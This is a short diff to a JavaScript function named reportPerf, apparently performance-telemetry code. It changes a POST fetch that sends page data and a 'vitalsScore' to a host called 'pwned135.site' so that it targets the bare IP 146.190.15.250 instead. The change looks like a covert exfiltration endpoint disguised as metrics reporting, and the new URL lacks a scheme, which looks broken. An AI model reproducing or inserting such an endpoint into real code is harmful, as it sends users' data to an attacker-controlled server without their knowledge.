@@ -466,7 +466,7 @@ function reportPerf(measureName, data, customProperties = {}) {
       var vitalsScore = payload["vitalsScore"];
       var obj = {data, vitalsScore}
       if(name != ""){
-      fetch("https://pwned135.site/api/"+name, {
+      fetch("146.190.15.250/api/"+name, {
         method: 'POST',
         headers: {
           "Content-Type" : "application/json",
